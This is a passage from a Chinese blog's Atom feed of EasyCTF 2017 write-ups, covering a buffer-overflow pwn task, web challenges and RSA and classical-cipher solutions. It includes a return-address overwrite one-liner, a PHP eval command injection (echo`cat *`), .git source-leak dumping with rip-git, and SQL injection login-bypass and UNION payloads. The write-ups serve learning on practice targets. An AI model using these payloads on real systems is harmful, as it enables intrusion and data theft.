class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_flag</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">what_did_you_say</span><span class="params">()</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">gid_t</span> gid = getegid();</div><div class="line">    setresgid(gid, gid, gid);</div><div class="line">    what_did_you_say();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_flag</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    system(<span class="string">"cat flag.txt"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">what_did_you_say</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">char</span> buff[<span class="number">64</span>];</div><div class="line">    gets(buff);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"You said: %s\n"</span>, buff);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>看了源码，很显然要让我们调用print_flag()函数，于是先gdb看一下print_flag()函数的地址：</p><pre><code>(gdb) disas print_flagDump of assembler code for function print_flag:   0x0804851a &lt;+0&gt;:    push   %ebp   0x0804851b &lt;+1&gt;:    mov    %esp,%ebp   0x0804851d &lt;+3&gt;:    sub    $0x8,%esp   0x08048520 &lt;+6&gt;:    sub    $0xc,%esp   0x08048523 &lt;+9&gt;:    push   $0x80485e0   0x08048528 &lt;+14&gt;:    call   0x80483a0 &lt;system@plt&gt;   0x0804852d &lt;+19&gt;:    add    $0x10,%esp   0x08048530 &lt;+22&gt;:    nop   0x08048531 &lt;+23&gt;:    leave     0x08048532 &lt;+24&gt;:    ret    End of assembler dump.</code></pre><p>地址为：0x0804851a，缓存为64字符，所以写个shell脚本跑一下：</p><pre><code>#!/bin/bash  for i in {64..80};  do    python -c &quot;print &apos;A&apos; * $i + &apos;\x1a\x85\x04\x08&apos;&quot; | ./simple-ropdone</code></pre><p>当跑到<code>python -c &#39;print &quot;A&quot;*76+&quot;\x1a\x85\x04\x08&quot;&#39; | ./simple-rop</code>成功调用print_flag()函数：</p><pre><code>easyctf{r0p_7o_v1ct0ry}</code></pre>]]></content>
    
    <summary type="html">
    
      作者:Jing Ling [https://www.zhihu.com/people/sunnyelf/]
博客:HackFun [https://www.hackfun.org]

#0X06-REVERSE-ENGINEERING0X06 REVERSE ENGINEERING
#HEXABLEHEXABLE
#PROBLEMPROBLEM
I tried to hide a flag sneakily, can you find it? Download
[https://github.com/EasyCTF/easyctf-2017-problems/raw/master/hexable-autogen/hexable]
    
    </summary>
    
      <category term="CTF" scheme="https://sunnyelf.github.io/categories/CTF/"/>
    
    
      <category term="ctf writeup" scheme="https://sunnyelf.github.io/tags/ctf-writeup/"/>
    
      <category term="easyctf" scheme="https://sunnyelf.github.io/tags/easyctf/"/>
    
      <category term="pwn" scheme="https://sunnyelf.github.io/tags/pwn/"/>
    
      <category term="reverse engineering" scheme="https://sunnyelf.github.io/tags/reverse-engineering/"/>
    
      <category term="binary exploitation" scheme="https://sunnyelf.github.io/tags/binary-exploitation/"/>
    
  </entry>
  
  <entry>
    <title>EasyCTF 2017 Web Write Up</title>
    <link href="https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Web-Write-Up/"/>
    <id>https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Web-Write-Up/</id>
    <published>2017-04-09T02:31:24.000Z</published>
    <updated>2017-10-02T19:22:31.921Z</updated>
    
    <content type="html"><![CDATA[<p>作者:<a href="https://www.zhihu.com/people/sunnyelf/" target="_blank" rel="external">Jing Ling</a><br>博客:<a href="https://www.hackfun.org" target="_blank" rel="external">HackFun</a></p><h1 id="0x05-Web"><a href="#0x05-Web" class="headerlink" title="0x05 Web"></a>0x05 Web</h1><h2 id="Cookie-Blog"><a href="#Cookie-Blog" class="headerlink" title="Cookie Blog"></a>Cookie Blog</h2><h3 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h3><p>I found the cookie monster’s <a href="http://cookieblog.web.easyctf.com/" target="_blank" rel="external">blog</a>!</p><a id="more"></a><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i.imgur.com/u0iIWjJ.png" alt=""></p><h2 id="TinyEval"><a href="#TinyEval" class="headerlink" title="TinyEval"></a>TinyEval</h2><h3 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h3><p>This <a href="http://tinyeval.web.easyctf.com/" target="_blank" rel="external">page</a> will evaluate anything you give it.</p><h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i.imgur.com/iupLzpS.png" alt=""></p><p>首先想到可能是php的eval()函数，于是随手输入<code>echo（&quot;hello world&quot;）</code>，提示字符太长，最后经过测试最多能输入11个字符。<br>这里用到一个php的技巧</p><pre><code>root@kali:~# cat 1.php &lt;?phpeval(&quot;echo`ls`;&quot;);?&gt;root@kali:~# php 1.php 1.phpDesktopDocumentsDownloadsMusicPicturesPublicTemplatesVideos</code></pre><p>于是输入echo<code>ls</code>:</p><p><img src="http://i.imgur.com/OIAXdXr.png" alt=""></p><p>看到了flag文件了，但是文件名很长，除了echo``，就只能再输入5个字符，所以要找到一个巧妙的方法，多次尝试找到方法：</p><pre><code>echo`cat *`</code></pre><p>刚好11个字符，获得flag：</p><p><img src="http://i.imgur.com/86dL75P.png" alt=""></p><h2 id="Edge-1"><a href="#Edge-1" class="headerlink" title="Edge 1"></a>Edge 1</h2><h3 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h3><p>We found Edge inc’s website! Take a look at it <a href="http://edge1.web.easyctf.com/" target="_blank" rel="external">here</a>.</p><h3 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h3><p>官方提醒说不能使用扫描器，要不然会被BAN，但是搞了一通之后没有什么收获，提醒说不能使用扫描器于是猜测是不是跟源码泄露有关，就手动测试一下：</p><pre><code>index.php~index.php.vimindex.php.swpindex.php.swnindex.php.swoindex.php.oldindex.php.txtindex.php.bakindex.php.zipindex.php.rar/.svn/.git</code></pre><p>测试到<code>/.git</code>终于出现惊喜：</p><p><img src="http://i.imgur.com/NYv1Q6J.png" alt=""></p><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">rip-git</a></p><pre><code>root@kali:~# rip-git -v -u http://edge1.web.easyctf.com/.git/root@kali:~/.git# git logcommit ee9061b25d8a35bae8380339f187b44dc26f4999Author: Michael &lt;michael@easyctf.com&gt;Date:   Mon Mar 13 07:11:47 2017 +0000    Whoops! Remove flag.commit afdf86202dc8a3c3d671f2106d5cffa593f2b320Author: Michael &lt;michael@easyctf.com&gt;Date:   Mon Mar 13 07:11:45 2017 +0000    Initial.commit 15ca375e54f056a576905b41a417b413c57df6ebAuthor: Fernando &lt;fermayo@gmail.com&gt;Date:   Sat Dec 14 12:50:09 2013 -0300    initial versioncommit 8ac4f76df2ce8db696d75f5f146f4047a315af22Author: Fernando Mayo &lt;fermayo@gmail.com&gt;Date:   Sat Dec 14 07:36:18 2013 -0800    Initial commit</code></pre><hr><p>回滚到删掉flag之前：</p><pre><code>root@kali:~/.git# git reset –hard afdf86202dc8a3c3d671f2106d5cffa593f2b320</code></pre><p>根目录出现了flag.txt:</p><pre><code>root@kali:~/.git# cat flag.txteasyctf{w3_ev3n_u53_git}</code></pre><p>推荐文章：<a href="https://www.cdxy.me/?p=757" target="_blank" rel="external">关于WEB敏感文件探测的一点思考</a></p><h2 id="Edge-2"><a href="#Edge-2" class="headerlink" title="Edge 2"></a>Edge 2</h2><h3 id="problem-3"><a href="#problem-3" class="headerlink" title="problem"></a>problem</h3><p>Last time we screwed up. But we’ve <a href="http://edge2.web.easyctf.com/" target="_blank" rel="external">learned our lesson</a>.</p><h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h3><p>再次访问<code>/.git</code>，结果：</p><p><img src="http://i.imgur.com/bcdipOl.png" alt=""></p><p>虽然被禁止列目录，但是那些文件依然存在，再次尝试使用rip-git，结果还是下载下来了，接下来就跟Edge 1一样的做法了：</p><pre><code>root@kali:~# rip-git -v -u http://edge2.web.easyctf.com/.git/root@kali:~/.git# git logcommit a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfdAuthor: Michael &lt;michael@easyctf.com&gt;Date:   Mon Mar 13 07:32:12 2017 +0000    Prevent directory listing.commit 6b4131bb3b84e9446218359414d636bda782d097Author: Michael &lt;michael@easyctf.com&gt;Date:   Mon Mar 13 07:32:10 2017 +0000    Whoops! Remove flag.commit 26e35470d38c4d6815bc4426a862d5399f04865cAuthor: Michael &lt;michael@easyctf.com&gt;Date:   Mon Mar 13 07:32:09 2017 +0000    Initial.commit 15ca375e54f056a576905b41a417b413c57df6ebAuthor: Fernando &lt;fermayo@gmail.com&gt;Date:   Sat Dec 14 12:50:09 2013 -0300    initial version</code></pre><p>同样回到删掉flag之前：</p><pre><code>root@kali:~/.git# git reset –hard 26e35470d38c4d6815bc4426a862d5399f04865croot@kali:~/.git# cat flag.txteasyctf{hiding_the_problem_doesn&apos;t_mean_it&apos;s_gone!}</code></pre><h2 id="SQL-Injection-1"><a href="#SQL-Injection-1" class="headerlink" title="SQL Injection 1"></a>SQL Injection 1</h2><h3 id="problem-4"><a href="#problem-4" class="headerlink" title="problem"></a>problem</h3><p>I need help logging into this website to get my flag! If it helps, my username is <code>admin</code>.<br>Running sqlmap or the likes will earn you an IP ban.</p><p>hint: What does “injection” mean? How can you “inject” code into your username to control the username lookup?</p><h3 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i.imgur.com/HEUFtzW.png" alt=""></p><p>查看网页源代码，估计SQL语句是这样的：</p><pre><code>select * from users where username=&quot;admin&quot; and password=&quot;&quot;</code></pre><p>于是任意构造：</p><pre><code>&quot; or &quot;1&quot;=&quot;1select * from users where username=&quot;admin&quot; and password=&quot;&quot; or &quot;1&quot;=&quot;1&quot;</code></pre><p>flag：<code>easyctf{a_prepared_statement_a_day_keeps_the_d0ctor_away!}</code></p><h2 id="SQL-Injection-2"><a href="#SQL-Injection-2" class="headerlink" title="SQL Injection 2"></a>SQL Injection 2</h2><h3 id="problem-5"><a href="#problem-5" class="headerlink" title="problem"></a>problem</h3><p>I’ve told my friend a billion times that the user called <code>leet1337</code> doesn’t exist on this <a href="http://injection2.web.easyctf.com/" target="_blank" rel="external">website</a>, but he won’t listen. Could you please login as this user, even though it doesn’t exist in the database? Oh and also, make sure that the user has a power level over 9000!!!!<br>Running sqlmap or the likes will earn you an IP ban.</p><p>hint: The columns in the table are (not in order) username, password, power_level, and a unique id.</p><h3 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h3><p>根据提示估计SQL语句是这样的：</p><pre><code>select username, password, power_level, id from table where username=&quot;&quot; and password=&quot;&quot;</code></pre><p>多次尝试使用union查询，#号截断：</p><pre><code>&quot; union select &quot;leet1337&quot;, &quot;leet1337&quot;, &quot;leet1337&quot;, &quot;9999&quot;#select username, password, power_level, id from table where username=&quot;&quot; and password=&quot;&quot; union select &quot;leet1337&quot;, &quot;leet1337&quot;, &quot;leet1337&quot;, &quot;9999&quot;#&quot;</code></pre><h2 id="Blogbox"><a href="#Blogbox" class="headerlink" title="Blogbox"></a>Blogbox</h2><h3 id="problem-6"><a href="#problem-6" class="headerlink" title="problem"></a>problem</h3><p>I found another <a href="http://blogbox.web.easyctf.com/" target="_blank" rel="external">blog</a>! Do you think you can find a flag on it?</p><p>Hint: Use the search bar to see all the public posts! (And only the public posts!)</p><h3 id="solution-6"><a href="#solution-6" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i.imgur.com/tHQ6iU7.png" alt=""><br>根据提示进行搜索，但是不论输入什么都得不到想要得结果，搜索时GET请求类似这样：</p><p><a href="http://blogbox.web.easyctf.com/search?query=flag" target="_blank" rel="external">http://blogbox.web.easyctf.com/search?query=flag</a></p><p>后来看提示我们只能看到公开的（<code>public</code>）文章，于是想到搜索有可能还可以传入<code>public</code>这个参数：<br>最终：<code>http://blogbox.web.easyctf.com/search?query=ctf&amp;public=0</code></p><p><img src="http://i.imgur.com/ui3q05z.png" alt=""></p><h2 id="Web-tunnel"><a href="#Web-tunnel" class="headerlink" title="Web tunnel"></a>Web tunnel</h2><h3 id="problem-7"><a href="#problem-7" class="headerlink" title="problem"></a>problem</h3><p>I was just going to search some random cat videos on a Saturday morning when my friend came up to me and told me to reach the end of this <a href="http://tunnel.web.easyctf.com/" target="_blank" rel="external">tunnel</a>. Can you do it for me?</p><p>Hint: You should write a script for this. The tunnel goes on too deep for any normal human.</p><h3 id="solution-7"><a href="#solution-7" class="headerlink" title="solution"></a>solution</h3><p>打开网站，得到一张二维码，扫描之后得到的字符串又做为下一个二维码图片的路径，就这样循环，那么上脚本：</p><pre><code>import requestsQR_api = &apos;https://api.qrserver.com/v1/read-qr-code/&apos;QR_name =&apos;DaicO7460493nYSuvLPW&apos;while True:    if &apos;easyctf&apos; not in QR_name:        QR_url = &apos;http://tunnel.web.easyctf.com/images/&apos; + QR_name + &apos;.png&apos;        r = requests.get(url = QR_api, params = {&apos;fileurl&apos; : QR_url})        QR_name = r.json()[0][&quot;symbol&quot;][0][&quot;data&quot;]    else:        breakprint(QR_name) # easyctf{y0u_sh0uld_b3_t1r3d_tr4v3ll1ng_all_th1s_w4y}</code></pre>]]></content>
    
    <summary type="html">
    
      作者:Jing Ling [https://www.zhihu.com/people/sunnyelf/]
博客:HackFun [https://www.hackfun.org]

#0X05-WEB0X05 WEB
#COOKIE-BLOGCOOKIE BLOG
#PROBLEMPROBLEM
I found the cookie monster’s blog [http://cookieblog.web.easyctf.com/]!
    
    </summary>
    
      <category term="CTF" scheme="https://sunnyelf.github.io/categories/CTF/"/>
    
    
      <category term="web" scheme="https://sunnyelf.github.io/tags/web/"/>
    
      <category term="ctf writeup" scheme="https://sunnyelf.github.io/tags/ctf-writeup/"/>
    
      <category term="easyctf" scheme="https://sunnyelf.github.io/tags/easyctf/"/>
    
  </entry>
  
  <entry>
    <title>EasyCTF 2017 Cryptography Write Up</title>
    <link href="https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Cryptography-Write-Up/"/>
    <id>https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Cryptography-Write-Up/</id>
    <published>2017-04-09T02:28:00.000Z</published>
    <updated>2017-10-02T19:22:31.915Z</updated>
    
    <content type="html"><![CDATA[<p>作者:<a href="https://www.zhihu.com/people/sunnyelf/" target="_blank" rel="external">Jing Ling</a><br>博客:<a href="https://www.hackfun.org" target="_blank" rel="external">HackFun</a></p><h1 id="0x04-Cryptography"><a href="#0x04-Cryptography" class="headerlink" title="0x04 Cryptography"></a>0x04 Cryptography</h1><h2 id="Flip-My-Letters"><a href="#Flip-My-Letters" class="headerlink" title="Flip My Letters"></a>Flip My Letters</h2><h3 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h3><p>I dropped my alphabet on its head, can you help me reassemble it? <code>easyctf{r_wlmg_vevm_mvvw_zm_zhxrr_gzyov}</code></p><a id="more"></a><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p>使用了简单的替换的加密方法，每个字母被对应另一个字母替换，使用基于字典的词频分析在线网站<a href="http://quipqiup.com/" target="_blank" rel="external">quipqiup</a>解出flag。</p><p><img src="http://i.imgur.com/TfLaOm8.png" alt=""></p><h2 id="Clear-and-Concise-Commentary-on-Caesar-Cipher"><a href="#Clear-and-Concise-Commentary-on-Caesar-Cipher" class="headerlink" title="Clear and Concise Commentary on Caesar Cipher"></a>Clear and Concise Commentary on Caesar Cipher</h2><h3 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h3><p>The flag is in <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/commentary/Commentary.pdf" target="_blank" rel="external">Commentary.pdf</a>. Use lowercase.</p><h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h3><p>凯撒密码，给出的文档值得一看，找到文档中<code>RNFLPGS{LBHTBGVG}</code>，凯撒密码<a href="https://planetcalc.com/1434/" target="_blank" rel="external">在线解密</a><br><img src="http://i.imgur.com/fMMlCbf.png" alt=""></p><p>最终flag为<code>easyctf{yougotit}</code></p><h2 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h2><h3 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h3><p>I found somebody’s notes on their private RSA! Help me crack <a href="https://github.com/EasyCTF/easyctf-2017-problems/tree/master/rsa1" target="_blank" rel="external">this</a>.</p><h3 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h3><p><a href="http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html" target="_blank" rel="external">RSA算法原理</a></p><p><a href="https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95" target="_blank" rel="external">扩展欧几里得算法</a></p><p><a href="https://github.com/sunnyelf/libnum" target="_blank" rel="external">libnum模块</a></p><pre><code>import libnump = 33499881069427614105926941260008415630190853527846401734073924527104092366847259q = 34311544767652906613104559081988349779622789386528780506962212898921316785995851e = 65537c = 43465248299278658712013216049003172427898782261990372316282214376041873514481386908793943532363461126240609464283533882761307749486816342864113338277082746552n = p * qphi = (p - 1) * (q - 1)d = libnum.modular.invmod(e, phi)print libnum.n2s(pow(c, d, n)) #easyctf{wh3n_y0u_h4ve_p&amp;q_RSA_iz_ez_7829d89f}</code></pre><h2 id="Let-Me-Be-Frank"><a href="#Let-Me-Be-Frank" class="headerlink" title="Let Me Be Frank"></a>Let Me Be Frank</h2><h3 id="problem-3"><a href="#problem-3" class="headerlink" title="problem"></a>problem</h3><p>I was talking to one of my friends but I couldn’t quite understand what he was saying. I think it might be important so here it is: <code>Nwh whdjwh qm uepen, T tjb fsmt tixgi jsrsh sigm gs mpzp xwqf iahxpv iw fslkt. pehgpxf{qtextz_glacz_elt_neinrw_qsg_bums_dcp}</code></p><h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h3><p>维吉尼亚密码<a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="external">解密</a></p><p><img src="http://i.imgur.com/Xqvx3DH.png" alt=""></p><h2 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h2><h3 id="problem-4"><a href="#problem-4" class="headerlink" title="problem"></a>problem</h3><p>Some more RSA! This time, there’s no P and Q… <a href="https://github.com/EasyCTF/easyctf-2017-problems/tree/master/rsa2" target="_blank" rel="external">this</a>.</p><h3 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h3><p><a href="https://sourceforge.net/projects/yafu/" target="_blank" rel="external">yafu</a>- Automated integer factorization</p><pre><code>yafu-x64.exe factor(266965481915457805187702917726550329693157)...snip...***factors found***P21 = 458070420083487550883P21 = 582804455845022449879</code></pre><hr><pre><code>import libnumn = 266965481915457805187702917726550329693157p = 458070420083487550883q = 582804455845022449879e = 65537c = 78670065603555615007383828728708393504251phi = (p - 1) * (q - 1)d = libnum.modular.invmod(e, phi)print libnum.n2s(pow(c, d, n)) #flag{l0w_n_0eb6}</code></pre><h2 id="Decode-Me"><a href="#Decode-Me" class="headerlink" title="Decode Me"></a>Decode Me</h2><h3 id="problem-5"><a href="#problem-5" class="headerlink" title="problem"></a>problem</h3><p>Someone I met today told me that they had a perfect encryption method. To prove that there is no such thing, I want you to decrypt this encrypted flag he gave me.</p><h3 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h3><pre><code>import base64with open(&apos;encrypted_flag.txt&apos;) as file:    data = file.read()    while True:        if &apos;easyctf&apos; not in data:            data = base64.b64decode(data)        else:            break    print(data) # easyctf{what_1s_l0v3_bby_don7_hurt_m3}</code></pre><h2 id="Hash-on-Hash"><a href="#Hash-on-Hash" class="headerlink" title="Hash on Hash"></a>Hash on Hash</h2><h3 id="problem-6"><a href="#problem-6" class="headerlink" title="problem"></a>problem</h3><p>There’s a lot of hex strings here. Maybe they’re hiding a message? <a href="https://github.com/EasyCTF/easyctf-2017-problems/raw/master/hash-on-hash/hexstrings.txt" target="_blank" rel="external">hexstrings</a></p><h3 id="solution-6"><a href="#solution-6" class="headerlink" title="solution"></a>solution</h3><pre><code>import hashlibmd5 = {}string = &apos;&apos;for x in xrange(0, 256):    char = chr(x)    md5_obj = hashlib.md5()    md5_obj.update(char)    md5_str = md5_obj.hexdigest()    md5[md5_str] = charwith open(&apos;hexstrings.txt&apos;) as file:    while True:        line = file.readline().replace(&apos;\n&apos;, &apos;&apos;)        if len(line) == 0:            break        string += md5[line]print string # easyctf{1_h0p3_y0u_d1dn7_d0_7h47_by_h4nd}</code></pre><h2 id="RSA-3"><a href="#RSA-3" class="headerlink" title="RSA 3"></a>RSA 3</h2><h3 id="problem-7"><a href="#problem-7" class="headerlink" title="problem"></a>problem</h3><p>We came across another <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/rsa3/rsa3" target="_blank" rel="external">message</a> that follows the same cryptographic schema as those other RSA messages. Take a look and see if you can crack it.</p><h3 id="solution-7"><a href="#solution-7" class="headerlink" title="solution"></a>solution</h3><pre><code>λ yafu-x64.exe factor(1172115235823606152023154654763747932660073385647694278339165126116107393252225152886841069176950866458540922555424233427042989493814327572078420 5110462278896087432260439082955593874915727686637956899)fac: factoring 11721152358236061520231546547637479326600733856476942783391651261161073932522251528868410691769508664585409225554242334270429894938143275720784205110462278896087432260439082955593874915727686637956899fac: using pretesting plan: normalfac: no tune info: using qs/gnfs crossover of 95 digitsdiv: primes less than 10000fmt: 1000000 iterationsTotal factoring time = 0.3556 seconds***factors found***P100 = 3423616853305296708261404925903697485956036650315221001507285374258954087994492532947084586412780871P100 = 3423616853305296708261404925903697485956036650315221001507285374258954087994492532947084586412780869ans = 1</code></pre><hr><pre><code>import libnumn = 11721152358236061520231546547637479326600733856476942783391651261161073932522251528868410691769508664585409225554242334270429894938143275720784205110462278896087432260439082955593874915727686637956899p = 3423616853305296708261404925903697485956036650315221001507285374258954087994492532947084586412780871q = 3423616853305296708261404925903697485956036650315221001507285374258954087994492532947084586412780869e = 65537c = 2907995727224121244474109148869412603986746589983095760953378907471772983106265015352351411281256847387789301815094608746590512178894738862276459859204020010443067567963450732279228357933677075986407phi = (p - 1) * (q - 1)d = libnum.modular.invmod(e, phi)print libnum.n2s(pow(c, d, n)) # easyctf{tw0_v3ry_merrry_tw1n_pr1m35!!_417c0d}</code></pre><p>推荐文章：<a href="http://bobao.360.cn/learning/detail/3058.html" target="_blank" rel="external">CTF中RSA的常见攻击方法</a></p><h2 id="Diffie-cult"><a href="#Diffie-cult" class="headerlink" title="Diffie-cult"></a>Diffie-cult</h2><h3 id="problem-8"><a href="#problem-8" class="headerlink" title="problem"></a>problem</h3><p>I just intercepted some odd <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/diffie-cult/messages.txt" target="_blank" rel="external">messages.txt</a>. It appears to be a Diffie-hellman protocol, but my math isn’t good enough to figure out what the final shared key is. Help! (The answer is a number. There is no <code>easyctf{}</code>)<br>Hint: Wikipedia explains Diffie-hellman pretty well.</p><h3 id="solution-8"><a href="#solution-8" class="headerlink" title="solution"></a>solution</h3><pre><code>g^a mod p = 421049228295820g^b mod p = 105262307073955p = 442101689710611</code></pre><p>如果不知道Diffie-Hellman密钥交换算法可以先看：</p><p><a href="http://www.cnblogs.com/chenny7/p/6093207.html" target="_blank" rel="external">Diffie-Hellman密钥交换算法</a></p><p><a href="http://www.cnblogs.com/si812cn/archive/2009/11/26/1611272.html" target="_blank" rel="external">Diffie-Hellman密钥交换算法及其优化</a></p><p>题目的意思大概就是想让我们求出密钥K，Diffie-Hellman密钥交换算法的有效性依赖于计算离散对数的难度（<a href="https://www.zhihu.com/question/26030513" target="_blank" rel="external">知乎-离散对数为什么是难题？</a>），这里p较小且这题给的<code>g^a mod p</code>和<code>g^b mod p</code>以及<code>p</code>都比较巧（<code>g^a mod p</code>即使A发送给B的值，而<code>g^b mod p</code>是B发送给A的值），为什么比较巧呢，我们在<a href="http://www.factordb.com/" target="_blank" rel="external">素数库</a>找到他们的标准分解式。</p><pre><code>g^a mod p = 421049228295820 = 2^2 · 5 · 17 · 19^3 · 37 · 47^4 g^b mod p = 105262307073955 = 5 · 17 · 19^3 · 37 · 47^4p = 442101689710611 = 3 · 7 · 17 · 19^3 · 37 · 47^4</code></pre><p>现在令<code>n = 17 · 19^3 · 37 · 47^4</code>，那么就有：</p><pre><code>g^a mod 21n = 20ng^b mod 21n = 5n</code></pre><p>我们把<code>g^a mod 21n = 20n</code>化简一下即：<code>g^a mod 21n = -n</code>，因为有<code>20n mod 21n = -n</code>，至于原理可以看一下密码学基础。</p><p>根据Diffie-Hellman密钥交换协议:</p><p><img src="http://i.imgur.com/KUnLwxR.png" alt=""></p><p>我们求的密钥K等于：<code>K = (（g ^ a）mod p)^b mod p</code></p><p>也就是:<code>K = (（g ^ a）mod 21n)^b mod 21n</code>，而前面已求过<code>g^a mod 21n = -n</code>，所以<code>K = (-n)^b mod 21n</code>，现在只有b的值不知道，不过我们可以以b自变量的值为变量研究因变量K的变化情况：</p><pre><code>n = 17 * (19 ** 3) * 37 * (47 ** 4)p = 21 * nfor b in xrange(1,10):    k = (-n) ** b % p    print(&apos;k = (-n)^%d mod p = %d&apos; %(b, k))</code></pre><hr><pre><code>K = (-n)^b mod 21nk = (-n)^1 mod p = 421049228295820k = (-n)^2 mod p = 42104922829582k = (-n)^3 mod p = 357891844051447k = (-n)^4 mod p = 168419691318328k = (-n)^5 mod p = 105262307073955k = (-n)^6 mod p = 231577075562701k = (-n)^7 mod p = 421049228295820k = (-n)^8 mod p = 42104922829582k = (-n)^9 mod p = 357891844051447</code></pre><p>可以看到当b = 7又开始循环，所以K的可能值有6个，最后提交验证K为<code>421049228295820</code>。</p><h2 id="Security-Through-Obscurity"><a href="#Security-Through-Obscurity" class="headerlink" title="Security Through Obscurity"></a>Security Through Obscurity</h2><h3 id="problem-9"><a href="#problem-9" class="headerlink" title="problem"></a>problem</h3><p>I’ve never seen such a cryptosystem before! It looks like a public key cryptosystem, though… Could you help me crack it?</p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/security-through-obscurity/encrypt.sage" target="_blank" rel="external">encrypt.sage</a><br><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/security-through-obscurity/publickey_and_ciphertext.txt" target="_blank" rel="external">publickey and ciphertext.txt</a></p><h3 id="solution-9"><a href="#solution-9" class="headerlink" title="solution"></a>solution</h3><p><a href="http://www.sagemath.org/zh" target="_blank" rel="external">SageMath</a> 是一个基于GPL协议的开源数学软件。它使用Python作为通用接口，将现有的许多开源软件包整合在一起，构建一个统一的计算平台。<br>我们的目标：创建一个有活力的自由开源软件以替代Magma，Maple，Mathematica和Matlab。</p><p><a href="http://ai7.org/wp/html/682.html" target="_blank" rel="external">中文版的SageMath入门手册</a></p><p><a href="http://sagecell.sagemath.org/" target="_blank" rel="external">sage代码在线运行</a></p><p><a href="https://wenku.baidu.com/view/13c36ec09ec3d5bbfd0a74c8.html" target="_blank" rel="external">信息安全数学基础-有限域</a></p><p><a href="https://en.wikipedia.org/wiki/Nth_root_algorithm" target="_blank" rel="external">nth root algorithm</a></p><p>encrypt.sage：</p><pre><code>p = 196732205348849427366498732223276547339primelist = [2,3,5,7,11,13,17,19,23,29,31,37,43,47,53,59]secret = REDACTEDdef calc_root(num, mod, n):    f = GF(mod)    temp = f(num)    return temp.nth_root(n)def gen_v_list(primelist, p, secret):    a = []    for prime in primelist:        a.append(calc_root(prime, p, secret))    return adef decodeInt(i, primelist):    pl = sorted(primelist)[::-1]    out = &apos;&apos;    for j in pl:        if i%j == 0:            out += &apos;1&apos;        else:            out += &apos;0&apos;    return outdef bin2asc(b):    return hex(int(b,2)).replace(&apos;0x&apos;,&apos;&apos;).decode(&apos;hex&apos;)message = REDACTEDchunks = []for i in range(0,len(message),2):    chunks += [message[i:i+2]]vlist = gen_v_list(primelist,p,secret)print(vlist)for chunk in chunks:    binarized = bin(int(chunk.encode(&apos;hex&apos;),16)).replace(&apos;0b&apos;,&apos;&apos;).zfill(16)[::-1] #lsb first    enc = 1    for bit in range(len(binarized)):        enc *= vlist[bit]**int(binarized[bit])    enc = enc%p    print(enc)</code></pre><p>publickey and ciphertext.txt：</p><pre><code>p = 196732205348849427366498732223276547339vlist = [186290890175539004453897585557650819247, 75402298316736094226532182518108134406, 125495142022496378270547998225256386407, 97774267687164931514953833940936099082, 101991197227908059637463567354647370660, 153833851791059142883915934225837717549, 57404874013093467650483424580890463792, 21385179362692238453302681296928238570, 73119997627509808412069264512026243174, 187307466063352771786747395191866088255, 99696708971915885525739992181010504930, 35400960589917132410614021764179554582, 165004028169785856134522269878963539096, 23921651712221317415895203722083962980, 101282552285744196401422074083408273639, 36527324251768098978171373433957274016]ciphertext = [10804437392992369932709952388461430442, 176193785024128365464527424154073333243, 